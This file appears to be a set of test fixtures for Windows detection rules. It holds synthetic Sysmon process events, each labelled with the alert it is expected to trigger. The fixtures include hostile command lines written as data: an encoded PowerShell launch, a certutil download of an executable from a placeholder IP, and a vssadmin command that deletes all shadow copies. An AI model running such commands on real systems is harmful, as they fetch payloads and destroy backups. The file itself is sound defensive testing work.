{"name": "Encoded PowerShell from explorer", "expect": "PowerShell Started With Encoded Command", "event": {"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational", "computer": "WS01", "severityValue": "INFORMATION"}, "eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "commandLine": "powershell.exe -nop -enc SQBFAFgA", "parentImage": "C:\\Windows\\explorer.exe", "originalFileName": "PowerShell.EXE"}}}}
{"name": "Certutil download", "expect": "Certutil Used To Download A File", "event": {"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational", "computer": "WS01", "severityValue": "INFORMATION"}, "eventdata": {"image": "C:\\Windows\\System32\\certutil.exe", "commandLine": "certutil.exe -urlcache -split -f http://203.0.113.10/a.exe a.exe", "parentImage": "C:\\Windows\\System32\\cmd.exe", "originalFileName": "CertUtil.exe"}}}}
{"name": "Shadow copy delete", "expect": "Shadow Copies Deleted With Vssadmin Or Wmic", "event": {"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational", "computer": "WS01", "severityValue": "INFORMATION"}, "eventdata": {"image": "C:\\Windows\\System32\\vssadmin.exe", "commandLine": "vssadmin.exe delete shadows /all /quiet", "parentImage": "C:\\Windows\\System32\\cmd.exe", "originalFileName": "VSSADMIN.EXE"}}}}
{"name": "Benign PowerShell script", "expect": "none", "event": {"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational", "computer": "WS01", "severityValue": "INFORMATION"}, "eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "commandLine": "powershell.exe -File C:\\Scripts\\backup.ps1", "parentImage": "C:\\Windows\\explorer.exe", "originalFileName": "PowerShell.EXE"}}}}
